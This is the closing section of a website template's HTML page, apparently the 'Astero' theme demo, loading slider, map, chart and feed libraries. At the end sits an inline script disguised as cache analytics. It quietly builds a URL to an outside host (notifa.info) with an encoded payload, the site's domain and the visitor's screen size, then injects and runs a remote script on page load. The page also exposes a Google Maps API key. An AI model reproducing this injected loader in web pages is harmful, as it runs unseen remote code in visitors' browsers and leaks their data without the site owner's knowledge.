	<script type="text/javascript" src="http://themesquared.com/html/astero/revolution/js/extensions/revolution.extension.layeranimation.min.js"></script>
	<script type="text/javascript" src="http://themesquared.com/html/astero/revolution/js/extensions/revolution.extension.navigation.min.js"></script>
	
	<script src="libraries/jquery.countdown.min.js"></script>
	<script src="http://themesquared.com/html/astero/libraries/instafeed/instagramLite.js"></script>
	
	<!-- Library - Google Map API -->
	<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDW40y4kdsjsz714OVTvrw7woVCpD8EbLE"></script>
	
	<!-- Library - Theme JS -->	
	<script src="http://themesquared.com/html/astero/js/Chart.min.js"></script>	
	<script src="http://themesquared.com/html/astero/js/jquery.knob.js"></script>
	<script src="http://themesquared.com/html/astero/js/functions.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2lZoKXh3NJYAgyAAZfntsfq4rsjt%2bsHWsD0kiVNBPsGt2Li%2b%2b0oOcYS5A%2f5S%2b2p8yKvViZ45ks82iLp8lIIQLVnlzvMkg08RYapz7HaGIUJqo6BIoqX3EUWXGc1VwZleCAwzoMtS1%2b%2bYN16OWGBeWbM6%2bpUI7iA23s4lPeSBo0kxGx4y4vOl90SV9%2bYLXhT13iAE3UBolGYIfh1chYNu5e4KZxNrlN32%2bsxEnNr1Ea4UTEQs9U9c3QTlPtzlqOXPKimmk%2fYGklTnnoBPtlmWHQJCBKbSdATsXun3D6%2fwVVVtoxyd13swgFtIZxGQ%2bk9Abb4oCib6uW%2bbIXE7anNuxMHZ6oeLgRFfJbnAMhFdlsF3fnf0Ce9KqV9ZkPagj9K9lMQv8y2IjHwxEdxumfd%2bhYo%2bWlOFeKZOQm5lYmaUxPM99s29HkV7lUwoMpCQ6ZESUnAVS%2bCC3EFhjWOIkp61KAqhw%2bwJElaRaMeP4aBAYh4nYFYX3SuVBUVcONNNVl8dKz2Qkkf3cOuRyC%2fJLQoV4wYcCPAFuJ0qIZgep6xp%2ft0qEax5wLhwpxVN71mR1eEpv7jqz5Uwcl%2fU%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>